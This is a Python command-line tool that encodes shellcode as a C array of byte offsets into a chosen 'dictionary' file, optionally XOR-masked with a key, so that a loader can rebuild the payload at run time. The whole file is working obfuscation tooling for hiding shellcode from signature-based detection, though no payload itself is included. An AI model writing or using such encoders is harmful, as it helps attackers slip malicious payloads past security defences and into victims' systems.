import random
import re
import os
import sys
import argparse

def encode_shellcode_from_file(file_path, source_path, target_xor_key, use_xor):
    # read the shellcode
    if not os.path.exists(file_path):
        print(f"[-] Error: Shellcode file not found: {file_path}")
        sys.exit(1)
        
    with open(file_path, "r") as f:
        content = f.read().strip()

    # parse the C-style hex string into raw bytes
    hex_values = re.findall(r'(?:\\x|0x|)([0-9a-fA-F]{2})', content)
    
    if not hex_values:
        print("[-] Error: No hex bytes found. Ensure format is \\x00, 0x00, or raw hex.")
        sys.exit(1)
        
    payload_bytes = bytes([int(h, 16) for h in hex_values])
    
    # load the dictionary
    if not os.path.exists(source_path):
        print(f"[-] Error: Source file for alphabet not found: {source_path}")
        sys.exit(1)

    with open(source_path, "rb") as f:
        source_data = f.read()

    # 4. Index the source
    byte_map = {}
    for offset, byte in enumerate(source_data):
        if byte not in byte_map:
            byte_map[byte] = []
        byte_map[byte].append(offset)

    # generate the recipe
    indices = []
    # if XOR is disabled, we effectively XOR with 0 (no change)
    actual_key = target_xor_key if use_xor else 0

    for b in payload_bytes:
        if b not in byte_map:
            print(f"[-] Error: Byte {hex(b)} not found in {source_path}!")
            sys.exit(1)
        
        raw_offset = random.choice(byte_map[b])
        masked_offset = raw_offset ^ actual_key
        indices.append(masked_offset)

    # output array
    print(f"// --- Generated Output ---")
    print(f"// Input: {file_path}")
    print(f"// Source: {source_path}")
    print(f"// XOR Enabled: {use_xor}")
    if use_xor:
        print(f"// XOR Key (Serial): {hex(target_xor_key)}")
    
    print(f"unsigned long long alphabetSoup[] = {{")
    for i in range(0, len(indices), 12):
        chunk = indices[i:i + 12]
        print("    " + ", ".join(map(str, chunk)) + ",")
    print("};")

def main():
    parser = argparse.ArgumentParser(description="Encode shellcode indices using a source dictionary file.")
    
    # required arguments
    parser.add_argument("-i", "--input", required=True, help="Path to file containing shellcode string.")
    parser.add_argument("-s", "--source", required=True, help="Path to the dictionary file.")
    
    # optional XOR arguments
    parser.add_argument("-k", "--key", default="0", help="XOR key. Defaults to 0 if not provided.")
    parser.add_argument("--xor", action="store_true", help="Enable XOR encoding using the provided key")

    args = parser.parse_args()

    try:
        xor_key = int(args.key, 0)
    except ValueError:
        print("[-] Error: Key must be an integer or hex value (e.g., 0x4A45B9A3)")
        sys.exit(1)

    encode_shellcode_from_file(args.input, args.source, xor_key, args.xor)

if __name__ == "__main__":
    main()